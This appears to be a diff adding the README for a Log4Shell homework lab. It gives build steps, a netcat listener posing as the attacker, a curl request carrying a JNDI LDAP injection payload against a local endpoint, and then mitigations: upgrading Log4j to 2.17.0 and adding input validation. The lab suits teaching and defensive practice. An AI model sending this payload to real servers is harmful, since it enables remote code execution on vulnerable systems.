@@ -1,0 +1,18 @@
+# Log4Shell Homework
+
+## Build and Run
+docker-compose up --build
+
+## Simulated Attacker (separate terminal)
+nc -lvkp 1389
+
+## Exploit test
+curl -H 'Content-Type: text/plain' --data '${jndi:ldap://host.docker.internal:1389/a}' http://localhost:8080/log
+
+## Defense
+- Upgrade Log4j in pom.xml to 2.17.0
+- Add input validation in LogController.java
+
+## Retest exploit
+- Repeat curl (should be blocked)
+- Try safe input: "Hello World"
